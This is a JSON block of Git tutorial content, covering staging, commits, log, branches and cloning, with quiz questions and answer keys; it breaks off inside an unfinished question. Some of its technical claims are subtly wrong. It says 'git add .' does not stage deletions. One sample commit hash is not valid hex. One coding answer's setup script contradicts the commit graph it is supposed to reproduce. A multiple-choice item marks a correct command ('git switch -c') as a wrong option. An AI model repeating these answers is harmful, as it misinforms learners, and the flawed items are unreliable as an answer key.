[
  {
    "id": "b4d4cd08-7d9b-4a3e-b104-f723825b567f",
    "startLine": 10300,
    "endLine": 10399,
    "processedDate": "2025-06-17T11:32:28.489Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_git_staging_area",
          "title": "Git Staging Area (Index)",
          "content": "The Git staging area, also known as the 'index', is an intermediate area where you prepare changes before committing them to the repository. It acts as a buffer between your working directory (where you make changes) and your repository (where your committed history is stored). Changes are not permanently recorded until they are committed.\n\n### Key Concepts\n- **Working Directory**: Your current project files and folders.\n- **Staging Area (Index)**: A place to collect changes you want to include in your next commit. You explicitly add changes to this area.\n- **Local Repository**: The `.git` directory which stores all the history of your project, including committed snapshots.\n\n### `git add` Command\n`git add` is used to add changes from the working directory to the staging area. It does not save the changes permanently to the repository; it merely stages them for the next commit.\n\n- **`git add <file>`**: Stages specific changes from a single file. If you've modified multiple files but only want to commit changes from one, this is the command to use.\n- **`git add -A`**: (or `git add --all`) Stages *all* changes across the entire repository. This includes new files, modified files, and deleted files. This command is effective from any directory within the repository.\n- **`git add .`**: Stages all changes in the current directory and its subdirectories. This includes new files and modified files. It **does not stage deletions** unless you are in the root directory where `git add -A` would be more appropriate for deletions across the repo. From the root, `git add .` and `git add -A` often behave similarly for new/modified files, but `-A` explicitly handles deletions globally.\n\n### Importance\nThe staging area allows for fine-grained control over what goes into each commit. You can commit related changes together, keeping your commit history clean and easy to understand. This is crucial for effective version control and collaboration.",
          "examples": [
            {
              "id": "example_git_staging_1",
              "title": "Staging a specific file",
              "code": "# Assume 'README.md' has been modified\ngit add README.md\n# Only changes in README.md are staged.",
              "explanation": "This command stages only the changes made to `README.md`. Other modified files remain unstaged.",
              "language": "bash"
            },
            {
              "id": "example_git_staging_2",
              "title": "Staging all changes",
              "code": "# Assume 'index.html' is modified, 'styles.css' is new, 'old.js' is deleted\ngit add -A\n# All modifications, new files, and deletions are staged across the entire repository.",
              "explanation": "This command stages all changes detected by Git, including additions, modifications, and deletions, regardless of the current working directory. This is useful for preparing a full snapshot of your current work.",
              "language": "bash"
            },
            {
              "id": "example_git_staging_3",
              "title": "Staging changes in current directory",
              "code": "# Assume 'src/components/Button.js' is new, 'src/App.js' is modified\ncd src\ngit add .\n# Both Button.js (new) and App.js (modified) are staged if they are in or under 'src'.",
              "explanation": "This command stages all new and modified files within the current directory (`src` in this case) and its subdirectories. It's a convenient way to stage changes within a specific part of your project.",
              "language": "bash"
            }
          ],
          "relatedQuestions": [
            "question_git_staging_1",
            "question_git_staging_2",
            "question_git_staging_3",
            "question_git_staging_4",
            "question_git_staging_5"
          ],
          "relatedTasks": [
            "task_git_staging_and_commit"
          ],
          "tags": [
            "Git",
            "Version Control",
            "Staging Area",
            "git add",
            "Fundamentals"
          ],
          "technology": "Git",
          "prerequisites": [],
          "complexity": 4,
          "interviewRelevance": 9,
          "learningPath": "beginner",
          "requiredFor": [
            "git_commit",
            "git_workflow"
          ]
        },
        {
          "id": "theory_git_commit",
          "title": "Committing Changes in Git",
          "content": "A commit in Git is a snapshot of your repository at a specific point in time. It represents a permanent record of the changes you've staged. Each commit has a unique identifier (SHA-1 hash), and contains metadata such as the author, committer, date, and a commit message.\n\n### Key Concepts\n- **Commit**: A permanent record of the staged changes in your repository's history.\n- **Commit Message**: A descriptive message that explains what changes were made in the commit and why. Good commit messages are crucial for understanding project history.\n- **SHA-1 Hash**: A unique identifier for each commit, ensuring the integrity and immutability of the commit history.\n\n### `git commit` Command\nAfter staging your changes using `git add`, you use `git commit` to save those changes to the local repository.\n\n- **`git commit -m \"Commit message\"`**: This is the most common way to commit. The `-m` flag allows you to provide a commit message directly on the command line. It's essential to write clear, concise, and descriptive commit messages.\n\n### Best Practices for Commit Messages\n- **Subject Line**: Keep the subject line (first line) concise (50-72 characters) and descriptive. It should summarize the changes.\n- **Imperative Mood**: Use the imperative mood (e.g., \"Fix: bug\", \"Add: feature\", \"Update: docs\") rather than \"Fixed bug\" or \"Adding feature\".\n- **Body (Optional)**: If more detail is needed, leave a blank line after the subject, then provide a more detailed explanation of the changes, the reasoning behind them, and any related issues.\n- **One Responsibility**: Each commit should ideally represent a single logical change or responsibility. This makes reverting or cherry-picking changes easier.",
          "examples": [
            {
              "id": "example_git_commit_1",
              "title": "Basic Commit with Message",
              "code": "# After staging files with git add\ngit commit -m \"feat: Add user authentication module\"\n# This creates a new commit with the staged changes and the provided message.",
              "explanation": "This example shows a standard commit command with a descriptive commit message following conventional commit guidelines. The message clearly indicates a new feature.",
              "language": "bash"
            },
            {
              "id": "example_git_commit_2",
              "title": "Commit with Detailed Message",
              "code": "# After staging files\ngit commit -m \"fix: Resolve issue with pagination on dashboard\n\nThis commit fixes a bug where pagination links were not updating correctly after filtering. The previous implementation was not re-rendering the pagination component when filter criteria changed.\"",
              "explanation": "This demonstrates a commit with a subject line and a detailed body. The body explains the problem and the solution, providing valuable context for future reference.",
              "language": "bash"
            }
          ],
          "relatedQuestions": [
            "question_git_commit_1",
            "question_git_commit_2",
            "question_git_commit_3"
          ],
          "relatedTasks": [
            "task_git_staging_and_commit"
          ],
          "tags": [
            "Git",
            "Commit",
            "Version Control",
            "Commit Message",
            "Fundamentals"
          ],
          "technology": "Git",
          "prerequisites": [
            "theory_git_staging_area"
          ],
          "complexity": 5,
          "interviewRelevance": 9,
          "learningPath": "beginner",
          "requiredFor": [
            "git_history",
            "git_branches"
          ]
        },
        {
          "id": "theory_git_log",
          "title": "Viewing Commit History",
          "content": "Git maintains a complete history of all commits made to a repository. The `git log` command is your primary tool for inspecting this history. It displays commit details, including the commit hash, author, date, and commit message.\n\n### Key Concepts\n- **Commit History**: A chronological record of all commits in the repository, forming a directed acyclic graph (DAG).\n- **Commit Hash (SHA)**: A unique identifier for each commit, essential for navigating and referencing specific points in history.\n\n### `git log` Command Options\n- **`git log`**: Displays the full commit history, showing each commit with its SHA-1 hash, author, date, and full commit message. This can be verbose for a long history.\n- **`git log --oneline`**: Provides a compact, single-line view of the commit history. Each commit is represented by its short SHA and the first line of its commit message. This is excellent for quickly reviewing the linear history.\n- **`git log --graph`**: Visualizes the branch and merge history using ASCII art. This is incredibly useful for understanding how branches diverge and merge, providing a graphical representation of the commit DAG. It often combines well with `--oneline` (e.g., `git log --oneline --graph`).\n\n### Advanced `git log` Usage\n`git log` has many more options for filtering, formatting, and searching history. For instance, `--author`, `--grep`, `--since`, `--until`, `-p` (patch view), etc., can be used to tailor the output.",
          "examples": [
            {
              "id": "example_git_log_1",
              "title": "Basic `git log` output",
              "code": "git log\n# Sample output:\n# commit 2f9b3c1a2d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s\n# Author: John Doe <john.doe@example.com>\n# Date:   Mon Oct 26 10:00:00 2023 -0500\n#\n#     feat: Implement user profile page\n#\n# commit abcdef1234567890abcdef1234567890abcdef1\n# Author: Jane Smith <jane.smith@example.com>\n# Date:   Fri Oct 23 15:30:00 2023 -0500\n#\n#     fix: Correct typo in README.md",
              "explanation": "This shows the full details for each commit, including the complete SHA, author information, date, and the entire commit message. Useful for detailed inspections.",
              "language": "bash"
            },
            {
              "id": "example_git_log_2",
              "title": "Compact `git log --oneline` output",
              "code": "git log --oneline\n# Sample output:\n# 2f9b3c1 (HEAD -> main) feat: Implement user profile page\n# abcdef1 fix: Correct typo in README.md",
              "explanation": "This provides a concise view, showing only the short SHA and the first line of the commit message for each commit. It's excellent for a quick overview.",
              "language": "bash"
            },
            {
              "id": "example_git_log_3",
              "title": "Graphical `git log --graph` output",
              "code": "git log --graph --oneline --all\n# Sample output:\n# * 2f9b3c1 (HEAD -> main) feat: Implement user profile page\n# *   d1e2f3g Merge branch 'feature/auth'\n# |\\ \n# | * bcd1234 (feature/auth) feat: Add user authentication\n# * | abcdef1 fix: Correct typo in README.md\n# |/  \n# * 1234567 Initial commit",
              "explanation": "Combining `--graph` with `--oneline` and `--all` gives a powerful visualization of branching and merging, with concise commit information. This helps understand the project's evolution and parallel development.",
              "language": "bash"
            }
          ],
          "relatedQuestions": [
            "question_git_log_1",
            "question_git_log_2",
            "question_git_log_3"
          ],
          "relatedTasks": [
            "task_git_history_exploration"
          ],
          "tags": [
            "Git",
            "History",
            "git log",
            "Debugging",
            "Visualization"
          ],
          "technology": "Git",
          "prerequisites": [
            "theory_git_commit"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "git_workflow",
            "git_bisect"
          ]
        },
        {
          "id": "theory_git_branches",
          "title": "Working with Git Branches",
          "content": "Branches in Git are incredibly lightweight pointers to commits, allowing you to develop features, fix bugs, or experiment with ideas in isolation from the main codebase. When you create a branch, Git essentially creates a new line of development that can diverge from the main branch and later be merged back in.\n\n### Key Concepts\n- **Branch**: A lightweight, movable pointer to one of the commits. The 'master' or 'main' branch is the default branch.\n- **HEAD**: A symbolic reference to the branch you are currently on. When you commit, the HEAD pointer moves to the new commit.\n- **Merge**: The process of integrating changes from one branch into another.\n\n### `git branch` Commands\nThese commands primarily deal with managing branches themselves (listing, creating, deleting).\n- **`git branch`**: Lists all local branches in your repository. The currently active branch will typically be highlighted (e.g., with an asterisk).\n- **`git branch -v`**: (or `git branch --verbose`) Provides more detailed information for each branch, including the last commit on that branch (its SHA and subject) and its relationship to remote branches.\n- **`git branch --merged`**: Lists branches that have been fully merged into the current branch. These are typically safe to delete as their changes are already integrated.\n- **`git branch --no-merged`**: Lists branches that have *not* been merged into the current branch. These branches contain work that would be lost if deleted without merging.\n- **`git branch <branch-name>`**: Creates a new branch named `<branch-name>`, pointing to the commit that your current HEAD is pointing to. This command only creates the branch; it does not switch to it.\n\n### `git checkout` Commands\n`git checkout` is primarily used to switch branches or restore files.\n- **`git checkout <branch-name>`**: Switches your working directory and HEAD to the specified existing branch. Git will ensure your working directory reflects the state of that branch's last commit.\n- **`git checkout -b <branch-name>`**: This is a convenience command that combines two actions: it first creates a new branch named `<branch-name>` (like `git branch <branch-name>`) and then immediately switches your HEAD to that new branch (like `git checkout <branch-name>`). This is common for starting new feature development.\n\n### Deleting Branches\n- **`git branch -d <branch-name>`**: (or `git branch --delete`) Safely deletes the specified branch. Git will prevent deletion if the branch contains unmerged changes, protecting you from losing work. It typically requires the branch to be fully merged into its upstream branch or the current branch.\n- **`git branch -D <branch-name>`**: (or `git branch --delete --force`) Forcibly deletes the specified branch, even if it contains unmerged changes. Use with caution, as this can lead to loss of work if changes are not backed up or merged elsewhere. This is useful for deleting a branch whose work you are absolutely sure you don't need or has been rebased/squashed into another branch.",
          "examples": [
            {
              "id": "example_git_branches_1",
              "title": "Creating and Switching Branches",
              "code": "git branch new-feature\n# Creates a new branch named 'new-feature'\n\ngit checkout new-feature\n# Switches to the 'new-feature' branch",
              "explanation": "This sequence shows how to manually create a new branch and then switch to it. This is useful if you want to create a branch but not immediately switch context.",
              "language": "bash"
            },
            {
              "id": "example_git_branches_2",
              "title": "Creating and Switching (Combined)",
              "code": "git checkout -b develop-login\n# Creates a new branch 'develop-login' and switches to it.",
              "explanation": "This is the most common command for starting new feature work. It creates the branch and immediately puts you on it, ready to commit changes.",
              "language": "bash"
            },
            {
              "id": "example_git_branches_3",
              "title": "Deleting a Merged Branch",
              "code": "git branch -d feature/finished-task\n# Deletes 'feature/finished-task' if its changes are merged into the current branch.",
              "explanation": "This is the safe way to clean up old branches after they have been successfully integrated into your main line of development.",
              "language": "bash"
            },
            {
              "id": "example_git_branches_4",
              "title": "Forcibly Deleting a Branch",
              "code": "git branch -D temporary-experiment\n# Deletes 'temporary-experiment' even if it has unmerged changes. Use with caution!",
              "explanation": "This command is used when you are certain you want to discard the work on a branch, or if you've already integrated the changes via a rebase or squash and Git doesn't recognize it as a 'merge'.",
              "language": "bash"
            }
          ],
          "relatedQuestions": [
            "question_git_branches_1",
            "question_git_branches_2",
            "question_git_branches_3",
            "question_git_branches_4",
            "question_git_branches_5"
          ],
          "relatedTasks": [
            "task_git_branching_workflow"
          ],
          "tags": [
            "Git",
            "Branching",
            "git branch",
            "git checkout",
            "Workflow",
            "Collaboration"
          ],
          "technology": "Git",
          "prerequisites": [
            "theory_git_commit"
          ],
          "complexity": 6,
          "interviewRelevance": 10,
          "learningPath": "intermediate",
          "requiredFor": [
            "git_merge",
            "git_rebase",
            "git_pull_request_workflow"
          ]
        },
        {
          "id": "theory_git_remote_repos",
          "title": "Working with Git Remote Repositories",
          "content": "Remote repositories are versions of your project that are hosted on the internet or network. They are crucial for collaboration, backups, and sharing your work with others. Common remote hosting services include GitHub, GitLab, and Bitbucket.\n\n### Key Concepts\n- **Remote Repository**: A shared version of your Git repository hosted on a server, allowing multiple developers to collaborate.\n- **Origin**: The default name Git gives to the server repository when you `git clone` it.\n- **Local Repository**: The copy of the repository on your machine.\n\n### `git clone` Command\n`git clone` is used to create a local copy of an existing remote repository. When you clone a repository, Git automatically sets up a remote connection named `origin` pointing to the original repository.\n\n- **`git clone <repository-url>`**: Downloads a full copy of the specified remote repository to your local machine. This includes all files, branches, and the entire commit history. Git will create a new directory with the same name as the repository (unless specified otherwise) and initialize it as a Git repository, then check out the default branch (usually `main` or `master`).\n\n### How it Works\nWhen you clone a repository, Git essentially performs these steps:\n1.  Creates a new directory (e.g., `my-repo`).\n2.  Initializes a new Git repository inside that directory (`.git` folder).\n3.  Adds a remote called `origin` that points to the provided `repository-url`.\n4.  Fetches all branches and commits from the `origin` remote.\n5.  Checks out the default branch (e.g., `main` or `master`) into your working directory.\n\nThis command is typically the first step when joining an existing project or starting work on an open-source project.",
          "examples": [
            {
              "id": "example_git_remote_1",
              "title": "Cloning a GitHub repository",
              "code": "git clone https://github.com/octocat/Spoon-Knife.git\n# This will clone the 'Spoon-Knife' repository into a new directory named 'Spoon-Knife'.",
              "explanation": "This command downloads the entire 'Spoon-Knife' project from GitHub, creating a local copy that includes all its history, branches, and files, ready for local development.",
              "language": "bash"
            },
            {
              "id": "example_git_remote_2",
              "title": "Cloning to a specific directory name",
              "code": "git clone https://github.com/octocat/Spoon-Knife.git my-project\n# This will clone the repository into a directory named 'my-project'.",
              "explanation": "You can specify an optional second argument to `git clone` to rename the local directory that will be created. This is useful if the repository's default name isn't ideal for your project structure.",
              "language": "bash"
            }
          ],
          "relatedQuestions": [
            "question_git_remote_1",
            "question_git_remote_2",
            "question_git_remote_3"
          ],
          "relatedTasks": [
            "task_git_remote_simulation"
          ],
          "tags": [
            "Git",
            "Remote",
            "git clone",
            "Collaboration",
            "Setup"
          ],
          "technology": "Git",
          "prerequisites": [],
          "complexity": 5,
          "interviewRelevance": 9,
          "learningPath": "beginner",
          "requiredFor": [
            "git_push_pull",
            "git_fetch",
            "git_workflow"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_git_staging_1",
          "topic": "Git Staging Area",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the Git staging area (index)?",
          "answer": "To prepare changes before committing them to the repository, allowing you to select which changes go into the next commit.",
          "options": [],
          "analysisPoints": [
            "Understanding the role of the staging area as an intermediate step.",
            "Recognizing its importance in selective commits."
          ],
          "keyConcepts": [
            "Staging Area",
            "git add",
            "Commit"
          ],
          "evaluationCriteria": [
            "Ability to define the staging area's function."
          ],
          "example": "The staging area allows developers to review and organize changes, ensuring that only relevant modifications are included in a single commit, leading to a cleaner commit history.",
          "tags": [
            "Git",
            "Staging Area",
            "Basic"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_staging_2",
          "topic": "Git Staging Commands",
          "level": "medium",
          "type": "mcq",
          "question": "You have made changes to `fileA.txt`, created a new `fileB.js`, and deleted `fileC.css`. Which Git command would you use from the root of your repository to stage *all* these changes for the next commit?",
          "answer": "`git add -A`",
          "options": [
            "`git add .`",
            "`git add *`",
            "`git add -A`",
            "`git add fileA.txt fileB.js fileC.css`"
          ],
          "analysisPoints": [
            "Understanding the differences between `git add .` and `git add -A`.",
            "Knowing that `git add .` typically doesn't stage deletions without additional context.",
            "Recognizing the purpose of staging all types of changes (new, modified, deleted)."
          ],
          "keyConcepts": [
            "git add",
            "Staging Area",
            "Working Directory"
          ],
          "evaluationCriteria": [
            "Correctly identifying the command for global staging.",
            "Distinguishing between `-A` and `.` behavior."
          ],
          "example": "Explanation: `git add .` stages new and modified files in the current directory and its subdirectories but typically requires `git add -u` or explicit staging for deletions. `git add -A` (or `git add --all`) stages all changes (new, modified, and deleted) across the entire repository, making it the most comprehensive option for this scenario. `git add *` is less common and can behave unexpectedly with certain file names or shell expansions. Staging individual files manually is tedious for many changes.\n\n```bash\n# Initial state\ntouch fileA.txt fileC.css\ngit add . && git commit -m \"Initial files\"\n\n# Make changes\necho \"Modified\" > fileA.txt\ntouch fileB.js\nrm fileC.css\n\n# To stage all these changes:\ngit add -A\n\n# Now, git status would show all three changes staged.\n```",
          "tags": [
            "Git",
            "Staging",
            "Command Line",
            "MCQ"
          ],
          "prerequisites": [
            "theory_git_staging_area"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_staging_3",
          "topic": "Git Staging Commands",
          "level": "medium",
          "type": "open",
          "question": "Describe a scenario where `git add .` would be preferred over `git add -A`, and explain why.",
          "answer": "A scenario where `git add .` would be preferred over `git add -A` is when you are working on a large project with multiple subdirectories, and you only want to stage changes within your current working directory (and its subdirectories) without affecting changes in other parts of the repository. For example, if you are in the `src/components` directory, and you have made changes to files only within that directory, `git add .` would stage those specific changes. Meanwhile, `git add -A` would stage all changes across the entire repository, which might include changes in `src/pages` or `public/assets` that you are not yet ready to commit.",
          "analysisPoints": [
            "Understanding the scope difference between `.` and `-A`.",
            "Identifying practical use cases for selective staging.",
            "Emphasizing control over the commit content."
          ],
          "keyConcepts": [
            "git add .",
            "git add -A",
            "Staging Area",
            "Working Directory"
          ],
          "evaluationCriteria": [
            "Ability to explain the nuanced difference between commands.",
            "Providing a relevant and clear use case."
          ],
          "example": "```bash\n# Project structure:\n# root/\n#   src/\n#     components/Button.js (modified)\n#     pages/HomePage.js (modified)\n#   public/index.html (modified)\n\n# Scenario: You are only working on components and want to commit these changes separately.\ncd src/components\n\n# Using git add . here will only stage Button.js\ngit add .\n# After this, 'git status' would show Button.js staged, but HomePage.js and index.html unstaged.\n\n# If you used git add -A from root or anywhere, all changes would be staged.\n# This demonstrates fine-grained control over what gets staged for the next commit.\n```",
          "tags": [
            "Git",
            "Staging",
            "Best Practices",
            "Open-Ended"
          ],
          "prerequisites": [
            "theory_git_staging_area"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_staging_4",
          "topic": "Git Staging Area",
          "level": "easy",
          "type": "flashcard",
          "question": "What Git command is used to add specific changes from a single file to the staging area?",
          "answer": "`git add <file>`",
          "options": [],
          "analysisPoints": [
            "Recall of basic `git add` usage."
          ],
          "keyConcepts": [
            "git add",
            "Staging Area"
          ],
          "evaluationCriteria": [
            "Accurate recall of the command syntax."
          ],
          "example": "```bash\ngit add index.html\n```",
          "tags": [
            "Git",
            "Staging",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_git_staging_area"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_staging_5",
          "topic": "Git Workflow",
          "level": "hard",
          "type": "code",
          "question": "You are working on a new feature. You modified `feature.js`, added a new `style.css`, and refactored `helper.js` (resulting in many lines changed and some removed). You realize that `style.css` is not yet ready for commit, but `feature.js` and `helper.js` are. Write the sequence of Git commands to only stage and commit `feature.js` and `helper.js`.",
          "answer": "```bash\ngit add feature.js\ngit add helper.js\ngit commit -m \"feat: Implement feature logic and refactor helper\"\n```",
          "options": [],
          "analysisPoints": [
            "Ability to selectively stage specific files.",
            "Understanding that `git add` operates on the working directory to staging.",
            "Correctly forming a commit command with a descriptive message.",
            "Demonstrating awareness that unstaged files are not part of the commit."
          ],
          "keyConcepts": [
            "git add",
            "git commit",
            "Staging Area",
            "Selective Committing"
          ],
          "evaluationCriteria": [
            "Correct use of `git add` for multiple specific files.",
            "Correct use of `git commit` after staging.",
            "Implicitly understanding that `style.css` remains unstaged."
          ],
          "example": "The key here is to precisely stage only the files intended for the commit, leaving `style.css` in the working directory as an unstaged change.\n\n```bash\n# Initial setup (simulated)\nmkdir my-feature && cd my-feature\ngit init\ntouch feature.js style.css helper.js\necho \"initial feature\" > feature.js\necho \"initial style\" > style.css\necho \"initial helper\" > helper.js\ngit add . && git commit -m \"Initial commit\"\n\n# Make changes as per question\necho \"updated feature content\" >> feature.js # Modified\necho \"new style content\" > style.css         # New file (treated as modified if already existing)\necho \"refactored helper content\" > helper.js # Modified (with many changes)\n\n# To stage ONLY feature.js and helper.js:\ngit add feature.js\ngit add helper.js\n\n# Verify status (style.css should be unstaged)\ngit status\n\n# Commit the staged changes\ngit commit -m \"feat: Implement feature logic and refactor helper\"\n\n# After commit, git status should show style.css as an untracked or unstaged file.\n```",
          "tags": [
            "Git",
            "Staging",
            "Commit",
            "Code Challenge",
            "Workflow"
          ],
          "prerequisites": [
            "theory_git_staging_area",
            "theory_git_commit"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_commit_1",
          "topic": "Git Committing",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of the `-m` flag when using `git commit`?",
          "answer": "To provide a commit message directly on the command line.",
          "options": [],
          "analysisPoints": [
            "Recall of basic `git commit` syntax."
          ],
          "keyConcepts": [
            "git commit",
            "Commit Message"
          ],
          "evaluationCriteria": [
            "Accurate recall of the flag's function."
          ],
          "example": "```bash\ngit commit -m \"Initial project setup\"\n```",
          "tags": [
            "Git",
            "Commit",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_git_commit"
          ],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_commit_2",
          "topic": "Git Commit Best Practices",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following commit messages best adheres to common Git best practices?",
          "answer": "`feat: Add user profile management module`",
          "options": [
            "`Changed some stuff`",
            "`Fixed the bug in the login form. This took a while.`",
            "`Added new feature for user profiles`",
            "`feat: Add user profile management module`"
          ],
          "analysisPoints": [
            "Understanding the importance of conciseness and clarity.",
            "Recognizing the imperative mood for commit subjects.",
            "Identifying the use of prefixes for commit types (e.g., `feat:`, `fix:`)."
          ],
          "keyConcepts": [
            "Commit Message",
            "Best Practices",
            "Conventional Commits"
          ],
          "evaluationCriteria": [
            "Ability to identify a well-formed commit message.",
            "Knowledge of conventional commit guidelines."
          ],
          "example": "The option `feat: Add user profile management module` follows best practices by: \n1.  Using a prefix (`feat:`) to categorize the change.\n2.  Using the imperative mood (`Add` instead of `Added`).\n3.  Being concise yet descriptive of the change.\n\nOther options are either too vague, use the wrong tense, or contain unnecessary conversational elements.\n",
          "tags": [
            "Git",
            "Commit",
            "Best Practices",
            "MCQ"
          ],
          "prerequisites": [
            "theory_git_commit"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_commit_3",
          "topic": "Git Workflow",
          "level": "medium",
          "type": "open",
          "question": "Explain the full lifecycle of a new file being added to a Git repository, from creation to being part of the repository's history, using relevant Git commands.",
          "answer": "The lifecycle of a new file being added to a Git repository involves three main steps:\n\n1.  **Creation (Working Directory)**: A new file is created in the project's working directory. At this stage, Git is aware of its existence (if within the repository) but does not track its content. Its status is `Untracked`.\n    *   `touch new-file.js`\n    *   `git status` (will show `new-file.js` as untracked)\n\n2.  **Staging (Staging Area)**: The new file is added to the staging area using `git add`. This tells Git to include the file's current content in the next commit. Its status becomes `Changes to be committed`.\n    *   `git add new-file.js`\n    *   `git status` (will show `new-file.js` as new file to be committed)\n\n3.  **Committing (Local Repository)**: The staged file is permanently saved to the local repository's history as part of a new commit using `git commit`. A commit message is required to describe the changes. The file is now tracked and part of the project's version history.\n    *   `git commit -m \"feat: Add new-file.js for feature X\"`\n    *   `git status` (will show `nothing to commit, working tree clean`)\n    *   `git log --oneline` (will show the new commit in history)",
          "analysisPoints": [
            "Understanding the three states of a file in Git (untracked, staged, committed).",
            "Correctly applying `git add` and `git commit`.",
            "Explaining the purpose of each step.",
            "Demonstrating knowledge of `git status` and `git log` for verification."
          ],
          "keyConcepts": [
            "Working Directory",
            "Staging Area",
            "Local Repository",
            "git add",
            "git commit",
            "git status"
          ],
          "evaluationCriteria": [
            "Completeness of the lifecycle explanation.",
            "Accuracy of command usage.",
            "Clarity of explanations for each stage."
          ],
          "example": "This question tests the fundamental understanding of Git's three-tree architecture (Working Directory, Staging Area, Repository) and the commands that move changes between them.",
          "tags": [
            "Git",
            "Workflow",
            "Open-Ended",
            "Fundamentals"
          ],
          "prerequisites": [
            "theory_git_staging_area",
            "theory_git_commit"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_log_1",
          "topic": "Git History Viewing",
          "level": "easy",
          "type": "flashcard",
          "question": "Which `git log` option provides a compact, single-line view of the commit history?",
          "answer": "`--oneline`",
          "options": [],
          "analysisPoints": [
            "Recall of `git log` options."
          ],
          "keyConcepts": [
            "git log",
            "Commit History"
          ],
          "evaluationCriteria": [
            "Accurate recall of the option."
          ],
          "example": "```bash\ngit log --oneline\n```",
          "tags": [
            "Git",
            "History",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_git_log"
          ],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_log_2",
          "topic": "Git History Viewing",
          "level": "medium",
          "type": "mcq",
          "question": "You want to visualize your repository's branch and merge history using ASCII art. Which `git log` option would you use?",
          "answer": "`--graph`",
          "options": [
            "`--pretty=format`",
            "`--graph`",
            "`--decorate`",
            "`--all`"
          ],
          "analysisPoints": [
            "Understanding the specific visualization capabilities of `git log` options.",
            "Distinguishing between formatting, graphing, and branch display options."
          ],
          "keyConcepts": [
            "git log",
            "Branching",
            "Merging"
          ],
          "evaluationCriteria": [
            "Correctly identifying the option for graphical representation.",
            "Understanding the function of other options."
          ],
          "example": "The `--graph` option is specifically designed to display the commit history as a graph, showing divergences and merges. While other options like `--decorate` (shows branch/tag pointers) or `--all` (shows all branches) can be combined with `--graph`, `--graph` itself is responsible for the visual structure.\n\n```bash\ngit log --oneline --graph --decorate --all\n```",
          "tags": [
            "Git",
            "History",
            "Visualization",
            "MCQ"
          ],
          "prerequisites": [
            "theory_git_log",
            "theory_git_branches"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_log_3",
          "topic": "Git History Analysis",
          "level": "hard",
          "type": "code",
          "question": "Imagine a repository with the following commit history (from `git log --oneline --graph --all`):\n\n```\n* e7f8a9b (HEAD -> feature/new-ui) feat: Implement responsive layout\n* d1c2b3a refactor: Optimize CSS loading\n| * c9d0e1f (origin/develop, develop) feat: Add dark mode toggle\n| * b8a7c6d fix: Correct navigation bug\n|/\n* a6b5c4d (main) feat: Initial project setup\n```\n\nWrite a single `git log` command that would display only the commits from the `main` branch, without showing the `feature/new-ui` or `develop` branch commits, and in a verbose (full detail) format.",
          "answer": "```bash\ngit log main\n```",
          "options": [],
          "analysisPoints": [
            "Understanding that `git log` can take a branch name as an argument to limit the history displayed.",
            "Knowledge of the default verbose output of `git log` when no formatting options are given.",
            "Ability to interpret graph output to identify branches."
          ],
          "keyConcepts": [
            "git log",
            "Branching",
            "Commit History",
            "Filtering"
          ],
          "evaluationCriteria": [
            "Correctly applying `git log <branch-name>`.",
            "Implicitly understanding that `git log` by default shows full details."
          ],
          "example": "When `git log` is given a branch name (e.g., `git log main`), it will display the history of commits reachable from that specific branch, effectively filtering out commits that are only present on other branches. Since no formatting flags like `--oneline` are specified, it will default to the full verbose output.\n\n```bash\n# Simulating the log result with a command:\n# Create a dummy repo to demonstrate\nmkdir test_repo && cd test_repo\ngit init -b main\necho \"Initial\" > file1.txt\ngit add . && git commit -m \"feat: Initial project setup\"\n\ngit branch develop\ngit checkout develop\necho \"Nav fix\" > nav.txt\ngit add . && git commit -m \"fix: Correct navigation bug\"\necho \"Dark mode\" > dark.txt\ngit add . && git commit -m \"feat: Add dark mode toggle\"\n\ngit checkout main\necho \"Responsive\" > responsive.txt\ngit add . && git commit -m \"feat: Implement responsive layout\"\n\n# The command to show only main branch history\ngit log main\n```",
          "tags": [
            "Git",
            "History",
            "Branching",
            "Code Challenge",
            "Advanced"
          ],
          "prerequisites": [
            "theory_git_log",
            "theory_git_branches"
          ],
          "complexity": 7,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_git_branches_1",
          "topic": "Git Branching",
          "level": "easy",
          "type": "flashcard",
          "question": "What Git command is used to list all local branches?",
          "answer": "`git branch`",
          "options": [],
          "analysisPoints": [
            "Recall of basic `git branch` usage."
          ],
          "keyConcepts": [
            "git branch",
            "Branches"
          ],
          "evaluationCriteria": [
            "Accurate recall of the command."
          ],
          "example": "```bash\ngit branch\n```",
          "tags": [
            "Git",
            "Branching",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_git_branches"
          ],
          "complexity": 2,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_branches_2",
          "topic": "Git Branching Workflow",
          "level": "medium",
          "type": "mcq",
          "question": "You are currently on the `main` branch and want to start working on a new feature called `user-dashboard`. Which single command would create this new branch and immediately switch you to it?",
          "answer": "`git checkout -b user-dashboard`",
          "options": [
            "`git branch user-dashboard`",
            "`git switch -c user-dashboard`",
            "`git new-branch user-dashboard`",
